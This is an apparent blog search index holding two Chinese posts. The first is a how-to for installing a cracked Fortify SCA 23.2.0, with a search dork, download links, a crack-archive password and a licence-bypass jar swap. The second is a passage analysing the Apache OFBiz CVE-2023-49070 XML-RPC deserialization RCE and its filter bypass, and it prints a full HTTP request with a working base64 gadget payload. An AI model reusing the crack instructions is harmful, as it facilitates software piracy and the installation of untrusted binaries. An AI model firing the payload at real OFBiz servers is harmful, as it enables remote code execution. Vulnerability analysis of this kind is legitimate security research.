<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Fortify SCA v23.2.0破解版安装小记</title>
      <link href="/fortify-sca-v232-installation.html"/>
      <url>/fortify-sca-v232-installation.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-Fortify-SCA%E7%AE%80%E4%BB%8B">0x00 Fortify SCA简介</a></li><li><a href="#0x01-%E8%B5%84%E6%BA%90%E5%AF%BB%E6%89%BE">0x01 资源寻找</a></li><li><a href="#0x02-%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B">0x02 安装过程</a><ul><li><a href="#Fortify-SCA%E5%AE%89%E8%A3%85">Fortify SCA安装</a></li><li><a href="#Fortify-Apps-and-Tools%E5%AE%89%E8%A3%85">Fortify Apps and Tools安装</a></li><li><a href="#%E6%9B%BF%E6%8D%A2Jar%E6%96%87%E4%BB%B6">替换Jar文件</a></li></ul></li><li><a href="#0x03-%E8%A7%84%E5%88%99%E5%BA%93">0x03 规则库</a></li><li><a href="#0x04-%E4%BD%BF%E7%94%A8">0x04 使用</a></li></ul><h2 id="0x00-Fortify-SCA简介"><a href="#0x00-Fortify-SCA简介" class="headerlink" title="0x00 Fortify SCA简介"></a>0x00 Fortify SCA简介</h2><p>Fortify SCA，全称为Fortify Static Code Analyzer，是一款静态代码分析工具，可以帮助开发人员在软件开发过程中发现和修复安全漏洞。通过对源代码进行深度扫描，Fortify SCA可以准确地识别出各种类型的安全隐患，如SQL注入、跨站脚本等漏洞。同时，它也提供了强大的报告和审计功能，使得开发团队可以有效地管理和跟踪安全问题。这款软件广泛应用于各种规模的软件开发项目中，被业界公认为静态代码分析领域的领导者。</p><h2 id="0x01-资源寻找"><a href="#0x01-资源寻找" class="headerlink" title="0x01 资源寻找"></a>0x01 资源寻找</h2><p>利用Google Hacking手段找到了一个旧版本的破解包，并根据相关信息追查到破解包都是来自一个Telegram频道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(intext:&quot;pan.baidu.com&quot; OR intext:&quot;t.me&quot;)  AND intext:&quot;Fortify_SCA_23&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/post/fortify-sca-v232-installation/google-hacking.png"></p><p>这个电报频道在24年1月14日发布了较新版本的破解包。</p><p><img src="/img/post/fortify-sca-v232-installation/telegram.png"></p><p>相关文件下载链接如下，全部下载至本地并解压。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SCA: </span><br><span class="line">https://ponies.cloud/source_code_analysis/fortifySCA/win/Fortify_SCA_23.2.0_Windows.zip</span><br><span class="line"></span><br><span class="line">Tools: </span><br><span class="line">https://ponies.cloud/source_code_analysis/fortifySCA/win/Fortify_Tools_23.2.0_Windows.zip</span><br><span class="line"></span><br><span class="line">Crack &amp; License file (Password: Pwn3rzs):</span><br><span class="line">https://ponies.cloud/source_code_analysis/fortifySCA/Fortify_SCA_23.2_Crack_pwn3rzs_cyberarsenal.7z</span><br><span class="line"></span><br><span class="line">Rules:</span><br><span class="line">https://ponies.cloud/source_code_analysis/fortifySCA/FortifyRules_2023.3.0.0006_en.zip</span><br><span class="line">FortifyRules_zh_CH_2023.1.1.0001(离线规则库): https://mega.nz/file/6rwggQJD#OKgMxNHTqCvbGYxDtPcq6XPEpkVnymSR9qvfvFo6QMk</span><br></pre></td></tr></table></figure><h2 id="0x02-安装过程"><a href="#0x02-安装过程" class="headerlink" title="0x02 安装过程"></a>0x02 安装过程</h2><p>Fortify SCA v23.2.0破解版的安装过程相对简单，由于破解包来历不明，所以为了安全考虑，建议将其安装在一个虚拟机中，做好隔离。</p><h3 id="Fortify-SCA安装"><a href="#Fortify-SCA安装" class="headerlink" title="Fortify SCA安装"></a>Fortify SCA安装</h3><p>首先，先安装Fortify_SCA_23.2.0_Windows文件夹中的Fortify_SCA_23.2.0_windows_x64.exe。</p><p><img src="/img/post/fortify-sca-v232-installation/sca-installation.png"></p><p>点击下一步，并同意协议，再一路Next，直到出现如下图所示选择Fortify License文件位置时，选择Fortify_SCA_23.2_Crack_pwn3rzs_cyberarsenal文件夹中的fortify.license文件，继续下一步。</p><p><img src="/img/post/fortify-sca-v232-installation/sca-license.png"></p><p>然后就会出现LIM License界面，选择默认选项No，后续也是一路Next，最后等待安装。</p><p>如果在安装过程中出现如下报错，不用管就行，之后Fortify_SCA_23.2.0便将安装完毕。</p><p><img src="/img/post/fortify-sca-v232-installation/update-failed.png"></p><p><img src="/img/post/fortify-sca-v232-installation/sca-installed.png"></p><h3 id="Fortify-Apps-and-Tools安装"><a href="#Fortify-Apps-and-Tools安装" class="headerlink" title="Fortify Apps and Tools安装"></a>Fortify Apps and Tools安装</h3><p>第二个安装的就是Fortify_Tools_23.2.0_Windows文件夹中的Fortify_Apps_and_Tools_23.2.0_windows_x64.exe。</p><p>过程与SCA类似，一路默认下一步，到了选择License界面，就选择如上同样的fortify.license文件。</p><p><img src="/img/post/fortify-sca-v232-installation/apps-license.png"></p><p>继续一路下一步，等待安装结束。</p><p><img src="/img/post/fortify-sca-v232-installation/apps-installed.png"></p><h3 id="替换Jar文件"><a href="#替换Jar文件" class="headerlink" title="替换Jar文件"></a>替换Jar文件</h3><p>现在，便需要将Fortify_SCA_23.2_Crack_pwn3rzs_cyberarsenal文件夹中的fortify-common-23.2.0.0023.jar文件复制至<code>C:\Program Files\Fortify\Fortify_Apps_and_Tools_23.2.0\Core\lib\</code>、<code>C:\Program Files\Fortify\Fortify_SCA_23.2.0\Core\lib\</code>两个目录中。</p><p><img src="/img/post/fortify-sca-v232-installation/replace.png"></p><h2 id="0x03-规则库"><a href="#0x03-规则库" class="headerlink" title="0x03 规则库"></a>0x03 规则库</h2><p>最后，将下载的规则库文件解压，再将其中的ExternalMetadata和rules目录复制至<code>C:\Program Files\Fortify\Fortify_SCA_23.1.0\Core\config\</code>中。</p><p><img src="/img/post/fortify-sca-v232-installation/rule.png"></p><p>如果不习惯英文，则可以选择FortifyRules_zh_CH_2023.1.1.0001(离线规则库)。</p><h2 id="0x04-使用"><a href="#0x04-使用" class="headerlink" title="0x04 使用"></a>0x04 使用</h2><p>运行<code>C:\Program Files\Fortify\Fortify_Apps_and_Tools_23.2.0\bin\</code>目录中的auditworkbench.cmd，即可开启图形化界面。</p><p>如下图，正在对一个Java项目进行扫描中。</p><p><img src="/img/post/fortify-sca-v232-installation/scanning.png"></p><p>扫描完成后如下图展示所示。</p><p><img src="/img/post/fortify-sca-v232-installation/scanned.png"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code-audit </tag>
            
            <tag> sast </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-49070 Apache OFBiz XMLRPC RCE漏洞分析</title>
      <link href="/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html"/>
      <url>/apache-ofbiz-cve-2023-49070-xmlrpc-rce.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li><li><a href="#0x02-%E5%8E%86%E5%8F%B2%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E5%9B%9E%E9%A1%BE">0x02 历史相关漏洞修复回顾</a><ul><li><a href="#xmlrpc%E9%89%B4%E6%9D%83">xmlrpc鉴权</a></li><li><a href="#serializable%E5%85%B3%E9%94%AE%E8%AF%8D%E6%A3%80%E6%B5%8B">serializable关键词检测</a></li><li><a href="#%E7%A7%BB%E9%99%A4XML-RPC">移除XML-RPC</a></li></ul></li><li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">0x03 漏洞环境搭建</a></li><li><a href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x04 漏洞分析</a></li><li><a href="#0x05-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">0x05 漏洞复现</a></li><li><a href="#0x06-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x06 修复建议</a></li></ul><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>Apache OFBiz是一个开源的企业资源规划（ERP）系统，它提供了一套企业应用程序，可以集成和自动化企业的许多业务流程。</p><p>2023年12月初，Apache官方发布OFBiz新版本18.12.10，以移除XML-RPC组件的方式修复编号为CVE-2023-49070的远程代码执行漏洞。本次漏洞源于OFBiz使用了存在反序列化漏洞的XML-RPC组件，这个脆弱组件问题在早期的CVE-2020-9496漏洞中已有所体现，虽然官方在CVE-2020-9496漏洞之后，增加了Filter拦截与权限校验，但攻击者能够绕过这些判断逻辑，达到CVE-2020-9496 RCE漏洞的再次利用。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><ul><li>&lt;18.12.10</li></ul><h2 id="0x02-历史相关漏洞修复回顾"><a href="#0x02-历史相关漏洞修复回顾" class="headerlink" title="0x02 历史相关漏洞修复回顾"></a>0x02 历史相关漏洞修复回顾</h2><h3 id="xmlrpc鉴权"><a href="#xmlrpc鉴权" class="headerlink" title="xmlrpc鉴权"></a>xmlrpc鉴权</h3><p>由于CVE-2023-49070是CVE-2020-9496漏洞的绕过再利用，那便从CVE-2020-9496漏洞的修复方式开始看起，这个漏洞的影响范围为<code>&lt;17.12.04</code>，是源于使用的XML-RPC组件的反序列化漏洞。</p><p>2020年5月19日，官方对该漏洞进行了修复，修复方式很简单直接，对xmlrpc的访问增加了鉴权，阻止对xmlrpc的未授权访问，如下Commit。</p><p><a href="https://github.com/apache/ofbiz-framework/commit/d708d9a#diff-bb54e344de72488b4e358a9d8fd385a5d9a6aea32d7236e7c268889f6ba3a8f6">https://github.com/apache/ofbiz-framework/commit/d708d9a#diff-bb54e344de72488b4e358a9d8fd385a5d9a6aea32d7236e7c268889f6ba3a8f6</a></p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-auth-true.png"></p><p>这种不彻底的修复方式，使得该漏洞在认证后依然能够被利用。</p><h3 id="serializable关键词检测"><a href="#serializable关键词检测" class="headerlink" title="serializable关键词检测"></a>serializable关键词检测</h3><p>果不其然，2021年10月3日，名为Jie Zhu的Reporter向OFBiz官方报告了这个由于CVE-2020-9496补丁修复不彻底的认证后漏洞，当时最新的版本17.12.08也是受影响的。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12332.png"></p><p>官方表示这个问题本质上与OFBiz无关，而是由于XMLRPC存在的反序列化漏洞而导致的，但XMLRPC也停止了维护，因此也只能在OFBiz中对这个问题进行修复，修复方式是在<code>ContextFilter</code>类中增加黑名单关键词进行检测。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12332-asf-comment.png"></p><p>最初的黑名单关键词是<code>&lt;/serializable&gt;</code>，只要检测到请求正文中包含该关键词就报内容未经授权，Commit如下。</p><p><a href="https://github.com/apache/ofbiz-framework/commit/15c209a#diff-f37b7643914fa9638206d2d8f2c04d507c024581dec14b2a2588b4a4c46cf96b">https://github.com/apache/ofbiz-framework/commit/15c209a#diff-f37b7643914fa9638206d2d8f2c04d507c024581dec14b2a2588b4a4c46cf96b</a></p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/contextfilter-serializable-fix1.png"></p><p>对于官方采用的这种黑名单修复方式，很显然是无法覆盖全面的，总会存在绕过的方式，Jie Zhu也很快发现了绕过方式，在原来被检测的关键词的中间增加一个空格便能轻松绕过。最终，官方对此便又将检测的关键词换成了<code>&lt;/serializable</code>。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12332-zhu-comment.png"></p><p>不过，原本是由<code>org.apache.ofbiz.webapp.control.ContextFilter</code>类进行检测，现在变成了由<code>org.apache.ofbiz.base.util.CacheFilter</code>类，Commit如下。</p><p><a href="https://github.com/apache/ofbiz-framework/commit/fb49563">https://github.com/apache/ofbiz-framework/commit/fb49563</a></p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/cachefilter-serializable-fix.png"></p><p>此处的判断逻辑在后续还发生了一些变化，最终的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">// Get the request URI without the webapp mount point.</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">context</span> <span class="operator">=</span> ((HttpServletRequest) request).getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uriWithContext</span> <span class="operator">=</span> ((HttpServletRequest) request).getRequestURI();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> uriWithContext.substring(context.length());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;/control/xmlrpc&quot;</span>.equals(uri.toLowerCase())) &#123;</span><br><span class="line">        <span class="comment">// Read request.getReader() as many time you need</span></span><br><span class="line">        request = <span class="keyword">new</span> <span class="title class_">RequestWrapper</span>((HttpServletRequest) request);</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> request.getReader().lines().collect(Collectors.joining());</span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">&quot;&lt;/serializable&quot;</span>)) &#123;</span><br><span class="line">            Debug.logError(<span class="string">&quot;Content not authorised for security reason&quot;</span>, <span class="string">&quot;CacheFilter&quot;</span>); <span class="comment">// Cf. OFBIZ-12332</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="移除XML-RPC"><a href="#移除XML-RPC" class="headerlink" title="移除XML-RPC"></a>移除XML-RPC</h3><p>时间来到2023年4月26日，也就是本次CVE-2023-49070漏洞的出现，CVE-2023-49070漏洞是如上两种修复方式的绕过，这次官方对于该漏洞的修复方式非常彻底，直接将废弃的、无人维护的Apache XML-RPC进行了移除。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/OFBIZ-12812.png"></p><p>但他们只对18.12和22.01两个分支进行了Commit，这也就意味着17.12分支中的所有版本暂无补丁。针对18.12版本的Commit如下。</p><p><a href="https://github.com/apache/ofbiz-framework/commit/c59336f604">https://github.com/apache/ofbiz-framework/commit/c59336f604</a></p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/commit-c59336f604.png"></p><h2 id="0x03-漏洞环境搭建"><a href="#0x03-漏洞环境搭建" class="headerlink" title="0x03 漏洞环境搭建"></a>0x03 漏洞环境搭建</h2><p>下载18.12.09版本，搭建环境进行分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://archive.apache.org/dist/ofbiz/apache-ofbiz-18.12.09.zip</span><br><span class="line">unzip apache-ofbiz-18.12.09.zip &amp;&amp; <span class="built_in">cd</span> apache-ofbiz-18.12.09</span><br></pre></td></tr></table></figure><p>使用如下几条命令将OFBiz环境起起来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh gradle/init-gradle-wrapper.sh</span><br><span class="line">./gradlew cleanAll</span><br><span class="line">./gradlew <span class="string">&quot;ofbiz --load-data readers=seed,seed-initial,ext&quot;</span></span><br><span class="line">./gradlew ofbiz</span><br></pre></td></tr></table></figure><blockquote><p>搭建低版本（如17.12.04）的OFBiz，执行如上gradlew命令可能会报java.io.FileNotFoundException错误，此时需要修改<code>gradle/gradle-wrapper.properties</code>文件内容，将如下行替换至其中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">distributionUrl=https\://services.gradle.org/distributions/gradle-5.0-rc-5-bin.zip</span><br></pre></td></tr></table></figure></blockquote><p>启动后访问<code>https://localhost:8443/myportal/control/main</code>登录页面，以确认环境是否搭建成功。</p><p>确认完毕后，先关闭OFBiz，通过如下命令再次启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew ofbizDebug</span><br></pre></td></tr></table></figure><p>并在IDEA中新增如下Run&#x2F;Debug配置。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-idea-debug-conf.png"></p><p>这样便能对OFBiz进行调试了。</p><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-debugging.png"></p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据web.xml中的如下映射关系，可得知请求会先被<code>org.apache.ofbiz.base.util.CacheFilter</code>进行处理。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>CacheFilter<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CacheFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.ofbiz.base.util.CacheFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CacheFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所以将断点打至<code>org.apache.ofbiz.base.util.CacheFilter#doFilter</code>方法，先发送CVE-2020-9496的Payload。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8443</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3982</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span><span class="tag">&lt;<span class="name">methodName</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span><span class="tag">&lt;<span class="name">params</span>&gt;</span><span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">struct</span>&gt;</span><span class="tag">&lt;<span class="name">member</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>rce<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqjK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDk3OTQ2MTA4NzQyNjI1AQAgTHlzb3NlcmlhbC9Qd25lcjQ5Nzk0NjEwODc0MjYyNTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==<span class="tag">&lt;/<span class="name">serializable</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">member</span>&gt;</span><span class="tag">&lt;/<span class="name">struct</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span><span class="tag">&lt;/<span class="name">params</span>&gt;</span><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/img/post/apache-ofbiz-cve-2023-49070-xmlrpc-rce/ofbiz-debug-xmlrpc-equals.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span 